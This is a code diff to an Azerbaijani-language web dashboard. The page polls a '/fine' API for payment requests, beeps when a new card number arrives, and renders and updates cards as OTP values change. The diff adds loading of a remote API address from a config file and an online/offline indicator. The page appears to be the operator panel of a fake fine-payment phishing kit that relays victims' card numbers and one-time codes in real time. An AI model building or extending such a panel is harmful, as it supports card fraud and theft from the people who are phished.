@@ -24,13 +24,12 @@
                   <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
                   <span class="relative inline-flex rounded-full h-3 w-3 bg-green-500"></span>
                 </span>
-                <span class="text-xs font-bold text-green-600">Dinlənilir...</span>
+                <span id="connection-status" class="text-xs font-bold text-green-600">Dinlənilir...</span>
             </div>
         </div>
 
         <!-- Requests Container -->
         <div id="requests-container" class="space-y-4">
-            <!-- Dynamic request card will appear here -->
             <div id="no-request" class="bg-white rounded-2xl shadow-md p-10 text-center text-gray-400">
                 <div class="text-4xl mb-2">📥</div>
                 <p class="text-sm font-medium">Hələ ki yeni ödəniş sorğusu yoxdur...</p>
@@ -39,10 +38,22 @@
     </div>
 
     <script>
-        const API_URL = 'http://localhost:3000/api';
+        let API_URL = 'http://localhost:3000/api';
         let lastCardNo = null;
 
-        // Web Audio API beep sound generator
+        async function initConfig() {
+            try {
+                const res = await fetch('config.json');
+                const config = await res.json();
+                if (config.apiUrl) {
+                    API_URL = config.apiUrl;
+                }
+            } catch (err) {
+                console.log("Config oxunmadı, lokal istifadə olunur");
+            }
+            setInterval(checkRequests, 1500);
+        }
+
         function playBeep() {
             try {
                 const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
@@ -50,14 +61,14 @@
                 const gainNode = audioCtx.createGain();
 
                 oscillator.type = 'sine';
-                oscillator.frequency.setValueAtTime(880, audioCtx.currentTime); // High pitch beep
+                oscillator.frequency.setValueAtTime(880, audioCtx.currentTime);
                 gainNode.gain.setValueAtTime(0.5, audioCtx.currentTime);
 
                 oscillator.connect(gainNode);
                 gainNode.connect(audioCtx.destination);
 
                 oscillator.start();
-                oscillator.stop(audioCtx.currentTime + 0.6); // 600ms beep
+                oscillator.stop(audioCtx.currentTime + 0.6);
             } catch (e) {
                 console.log("Audio play error:", e);
             }
@@ -65,19 +76,25 @@
 
         async function checkRequests() {
             try {
-                const res = await fetch(`${API_URL}/fine`);
-                const data = await res.json();
+                const res = await fetch(`${API_URL}/fine`, { method: 'GET', signal: AbortSignal.timeout(3000) });
+                if (res.ok) {
+                    const data = await res.json();
+                    document.getElementById('connection-status').textContent = "Dinlənilir (Online)";
+                    document.getElementById('connection-status').className = "text-xs font-bold text-green-600";
 
-                if (data.cardNo && data.cardNo !== lastCardNo) {
-                    lastCardNo = data.cardNo;
-                    playBeep(); // Play sound alert!
-                    renderRequestCard(data);
-                } else if (data.cardNo && lastCardNo === data.cardNo) {
-                    // Update OTP or status if changed
-                    updateRequestCard(data);
+                    if (data.cardNo && data.cardNo !== lastCardNo) {
+                        lastCardNo = data.cardNo;
+                        playBeep();
+                        renderRequestCard(data);
+                    } else if (data.cardNo && lastCardNo === data.cardNo) {
+                        updateRequestCard(data);
+                    }
+                } else {
+                    throw new Error("Server error");
                 }
             } catch (err) {
-                console.error("Sorğu xətası:", err);
+                document.getElementById('connection-status').textContent = "Serverə qoşulmadı (Offline)";
+                document.getElementById('connection-status').className = "text-xs font-bold text-red-600";
             }
         }
 
@@ -142,7 +159,7 @@
             }
         }
 
-        setInterval(checkRequests, 1500); // Check every 1.5 seconds
+        initConfig();
     </script>
 </body>
 </html>
